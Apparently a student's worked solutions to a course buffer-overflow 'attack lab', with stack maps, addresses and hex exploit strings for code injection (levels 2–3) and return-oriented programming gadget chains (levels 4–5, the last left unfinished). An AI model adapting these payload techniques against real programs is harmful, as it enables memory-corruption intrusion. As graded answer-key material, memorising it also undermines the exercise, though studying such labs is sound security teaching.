=================Level 2===============================
00000000004017a8 <getbuf>
0000000000401968 <test>:
break points
test:
break points                                %rsp            
(1)*0x401971(before call to getbuf)        0x5561dca8
(2)*0x401976(after call to getbuf)         0x5561dca8
getbuf
(3)*0x4017a8(first inst of getbuf)         0x5561dca0 (location where return address in test is stored) ---> 0x401976
(4)*0x4017ac(after allocating buf)         0x5561dc78 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
(5)*0x4017b4(after call to Gets)           0x5561dc78
(6)*0x4017bd(just before retq)             0x5561dca0
Gets
(7)*0x401a40(first inst of Gets)           0x5561dc70 (location where return address in getbuf is stored) ---> 0x4017b4
(8)*0x401a91(last inst of Gets)            0x5561dc70
Order in which breakpoints will encounter
1-3-4-7-8-5-6-2
So accessable stack addresses for our code injection is
0x5561dc98-0x5561dc78
so value to be stored as return address 0x000000005561dc98
address of touch2: 0x00000000004017ec 

exploit string
68 ec 17 40 00 bf fa 97
b9 59 c3 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
ec 17 40 00 00 00 00 00
drawing stack frame
    mem         contents              desp
0x5561dca8       xxxxx               %rsp before call to getbuf in test
0x5561dca0      0x401976             %rsp for first instruction in buff contains return address in test function
0x5561dc78       xxxxx               allocation of buffer in getbuf (0xa0-0x78=0x28) = 40 bytes
0x5561dc70      0x4017b4             %rsp for first instruction in Gets contains return address in getbuf function

for below exploit string address of memory written
%rsp = 0x5561dc78 

  mem          0  1  2  3  4  5  6  7
0x5561dc78    bf fa 97 b9 59 c3 00 00  /* code to set %rdi and return */
0x5561dc80    00 00 00 00 00 00 00 00
0x5561dc88    00 00 00 00 00 00 00 00
0x5561dc90    00 00 00 00 00 00 00 00
0x5561dc98    00 00 00 00 00 00 00 00 
0x5561dca0    78 dc 61 55 00 00 00 00 /* start address of injected code */
0x5561dca8    ec 17 40 00 00 00 00 00 /* address of touch2 function */ 
=======================================================
=================Level 3===============================
cookie: 0x59b997fa
digit   string_representation
  5         35
  9         39
  b         62
  9         39
  9         39
  7         37
  f         66
  a         61
Breakpoints                                   %rsp
(1)*0x401971(before call to getbuf)        0x5561dca8
(2)*0x401976(after call to getbuf)         0x5561dca8
getbuf
(3)*0x4017a8(first inst of getbuf)         0x5561dca0 (location where return address in test is stored) ---> 0x401976
(4)*0x4017ac(after allocating buf)         0x5561dc78 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
(5)*0x4017b4(after call to Gets)           0x5561dc78
(6)*0x4017bd(just before retq)             0x5561dca0
Gets
(7)*0x401a40(first inst of Gets)           0x5561dc70 (location where return address in getbuf is stored) ---> 0x4017b4
(8)*0x401a91(last inst of Gets)            0x5561dc70
touch3
(9)*0x4018fa(first inst of touch3)         0x5561dca8
(10)*0x401963(last inst of touch3)         0x5561dca8
hexmatch
(11)*0x401854(after allocating stack)      0x5561dc00
(12)*0x4018f9(after deallocating stack)    0x5561dc98
injected code
(13)*0x5561dc78
Order in which breakpoints will encounter with injected code
1-3-4-7-8-5-6-2-9-11-12-10
Order in which breakpoints will encounter with injected code
1-3-4-7-8-5-6-13-9-11-12-10
After observing code for hexmatch we see that it modifies memory address 0x5561dc78
Which happens to be start address for buffer allocated in getbuf function. 
Below in expliot string. Here we have injected code at address 0x5561dc78 which
is a start of buffer allocated. And set our string representation of cookie at
address 0x5561dcb0-0x5561dcb8 which will not be modified by touch3 or hexmatch.

exploit string
0x5561dc78: 48 c7 c7 b0 dc 61 55 c3 /* injected code */
0x5561dc80: 00 00 00 00 00 00 00 00 
0x5561dc88: 00 00 00 00 00 00 00 00
0x5561dc90: 00 00 00 00 00 00 00 00
0x5561dc98: 00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
0x5561dca0: 78 dc 61 55 00 00 00 00 /* return address of injected code */
0x5561dca8: fa 18 40 00 00 00 00 00 /* return address of touch3 */
0x5561dcb0: 35 39 62 39 39 37 66 61 /* string representation of cookie */
0x5561dcb8: 00 00 00 00 00 00 00 00  
=======================================================
=================Level 4===============================
break points                                  %rsp
test
(1)0x401971(before call to getbuf)         0x7ffffffcf100
(2)0x401976(after call to getbuf)          0x7ffffffcf100
getbuf
(3)*0x4017a8(first inst of getbuf)         0x7ffffffcf0f8 (location where return address in test is stored) ---> 0x401976
(4)*0x4017ac(after allocating buf)         0x7ffffffcf0d0 (start address of %rsp in getbuf) --->start of buffer (40 bytes)
(5)*0x4017b4(after call to Gets)           0x7ffffffcf0d0
(6)*0x4017bd(just before retq)             0x7ffffffcf0f8
What we need attack string for this level as follows
1. first 40 bytes as padding
2. return address of gadget that pops value from stack into some register say r1
3. value of cookie
4. return address of gadget that moves value from register r1 to %rdi
5. return address of touch2 function.

Step 2
-------
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3                   	retq   
58 - pop %rax
90 - nop
c3 return
so address of this gadget: 0x4019ab
Step 3
------
value of cookie: 0x59b997fa

Step 4
------
possible instruction required
movq %rax, %rdi - 48 89 c7
retq - c3
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

48 89 c7 - movq %rax, %rdi
90       - nop
c3       - retq

so address of this gadget - 0x4019c5

Step 5
------
return address of touch2 function: 0x4017ec

Exploit string
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* first 40 bytes as padding string */
ab 19 40 00 00 00 00 00 /* address of first gadget */
fa 97 b9 59 00 00 00 00 /* value of cookie */
c5 19 40 00 00 00 00 00 /* address of second gadget */
fa 18 40 00 00 00 00 00 /* address of touch2 function */
=======================================================
=================Level 5===============================
Problems to be solved for phase 5
1. We need to generate string representation of cookie where on stack/memory and 
location is predicable and is not overwritten by stack modification by hexmatch function.
2. We need to pass pointer to above generated string representation into %rdi and call touch 3 function

cookie: 0x59b997fa
digit   string_representation
  5         35
  9         39
  b         62
  9         39
  9         39
  7         37
  f         66
  a         61
exploit string can consist of 
1. First 40 bytes as padding all zero
2. Address of gadget which should execute a pop instruction so that now %rsp now points to string represenation of cookie
   and moves the value of %rsp to some register may be %rdi
3. Return address of touch3 function

00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq   
  
above gadget is our live saver
1. move %rsp (somehow) to %rdi or %rsi
2. put offset on stack
3. pop offset to %rdi or %rsi
3. execute gadget add_xy
4. move result from %rax to %rdi

Step 1.
move %rsp into %rdi
48 89 e0 c3 # movq %rsp, %rax; retq; address: 0x401a06
48 89 c7 c3 # movq %rax, %rdi; retq; address: 0x4019a2



Step 2.
offset

Step 3.
pop offset value in %rax and then move value of %eax into %esi

58 90 c3 # pop %rax; retq; address: 0x4019ab

89 c2 # movl %eax, %edx; address: 0x401a42 
84 c0 # testb %al, %al
c3    # retq

89 d1 # movl %edx, %ecx; address: 0x401a69
08 db # orb %bl, %bl
c3    # retq

89 ce # movl %ecx, %esi; address: 0x401a27 
38 c0 # cmpb %al, %al
c3    # retq

Step 4. 
Call gadget lea    (%rdi,%rsi,1),%rax; retq
48 8d 04 37 c3 # lea    (%rdi,%rsi,1),%rax; retq address: 0x4019d6

Step 5.
move value of %rax to %rdi
48 89 c7 c3 # movq %rax, %rdi; retq; address: 0x4019a2

Step 6.
call touch3
address touch3

Step 7.
String representation of cookie
  5         35
  9         39
  b         62
  9         39
  9         39
  7         37
  f         66
  a         61
  null      00




=======================================================
